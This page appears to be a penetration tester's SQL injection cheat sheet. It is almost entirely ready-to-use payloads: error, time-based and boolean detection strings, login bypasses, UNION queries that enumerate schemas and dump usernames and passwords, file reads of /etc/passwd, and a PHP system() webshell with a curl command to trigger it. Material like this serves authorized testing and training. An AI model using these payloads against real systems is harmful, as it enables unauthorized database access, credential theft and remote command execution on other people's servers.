+++
title = "06 - Check - SQL Injection (Manual)"
+++

### Discern: Database Type

Not always possible but...

- Discern the type of database (MSSQL, MySQL, PostgreSQL, etc.)
    - `nmap` port/service scans
    - Web page error or debug output (from malformed requests)

### Detect: Possible Injection Points

Probe parameters from the webpage, usually input fields that correlate to `GET` or `POST` HTTP headers. Output is not necessarily reflected... can be from errors and time delays as well:

- reflected output → UNION
- true/false response differs → boolean blind
- timing delay differs → time blind
- nothing differs at all → not injectable / WAF

1. **Quote/error:** send paylaods  to observe SQL error / HTTP 500 / changed webpage

|Payload|Notes|
|---|---|
|`'`|Universal -- single quote|
|`"`|Universal -- double quote|
|`` ` ``|Rare (MySQL backtick)|
|`')`|Parenthesized query|
|`")`|Parenthesized + double quote|
|`' -- -`|With comment|
|`" -- -`|With comment|

2. **Sleep (best blind confirm + DB fingerprint):** fire all three, whichever delays tells the DB:

| Payload                                 | Database           |
| --------------------------------------- | ------------------ |
| `' AND SLEEP(5)-- -`                    | MySQL              |
| `' AND (SELECT 1 FROM pg_sleep(5))-- -` | PostgreSQL         |
| `';WAITFOR DELAY '0:0:5'-- -`           | MSSQL (must stack) |

3. **Boolean:** compare response SIZE:

| Payload                       | Notes                                              |
| ----------------------------- | -------------------------------------------------- |
| `' AND 1=1-- -`               | True condition -- normal response                  |
| `' AND 1=2-- -`               | False condition -- different response = injectable |

### Exploit: Bypass Logic or Get RCE

**Auth Bypass (login fields)**

|Payload|Notes|
|---|---|
|`admin' -- -`|Comment out password check|
|`admin' #`|MySQL comment variant|
|`' OR 1=1-- -`|Any user|
|`' OR '1'='1`|No comment needed|
|`') OR ('1'='1`|Parenthesized query|
|`admin') -- -`|Parenthesized + specific user|

**UNION-Based (reflected output required)**

Note: prefix search param with `%` to get all rows: `item=%' UNION SELECT ...`

| Payload                                                                                                                          | Notes                    |
| -------------------------------------------------------------------------------------------------------------------------------- | ------------------------ |
| `' ORDER BY 1,2,3,4,5,6,7-- -`                                                                                                   | Find column count        |
| `' UNION SELECT 1,2,3,4,5-- -`                                                                                                   | Find visible columns     |
| `' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -`                                                                                    | Type-less alternative    |
| `' UNION SELECT 1,version(),database(),4,5-- -`                                                                                  | Survey DB version + name |
| `' UNION SELECT null,table_name,column_name,table_schema,null FROM information_schema.columns WHERE table_schema=database()-- -` | Dump table/column names  |
| `' UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()-- -`               | All tables in one row    |

**Survey**

| Payload                                                                    | Notes      |
| -------------------------------------------------------------------------- | ---------- |
| `' OR 1=1 IN (SELECT @@version)-- -`                                       | MySQL      |
| `' OR 1=1 IN (SELECT version())-- -`                                       | PostgreSQL |
| `' OR 1=1 IN (SELECT CONCAT(username,0x20,password) FROM users)-- -`       | Dump creds |
| `' OR 1=1 IN (SELECT CONCAT(host,unique_users) FROM sys.host_summary)-- -` | Survey     |

**Write Webshell**

PHP Webshell used: `<?php system($_GET['cmd']); ?>`
**NOTE: match Webshell type with technology (PHP, ASP.NET, etc.) **

**Check for individual SQL type in their respective docs**

- [MySQL -- Read Files]({{% ref "mysql.md#read-files" %}})
- [MSSQL -- Read Files]({{% ref "mssql.md#read-files" %}})


Trigger the webshell:

```bash
curl -skLo- --path-as-is --get 'http://<TARGET>/shell.php' --data-urlencode $'cmd=id'
```

**Read File**

| Payload                                                                                                               | Database                |
| --------------------------------------------------------------------------------------------------------------------- | ----------------------- |
| `' UNION SELECT null,LOAD_FILE('/etc/passwd'),null,null,null-- -`                                                     | MySQL (needs FILE priv) |
| `';SELECT pg_read_file('/etc/passwd')-- -`                                                                            | PostgreSQL              |
| `' UNION SELECT null,BulkColumn,null FROM OPENROWSET(BULK 'C:\Windows\system32\drivers\etc\hosts',SINGLE_BLOB) x-- -` | MSSQL                   |
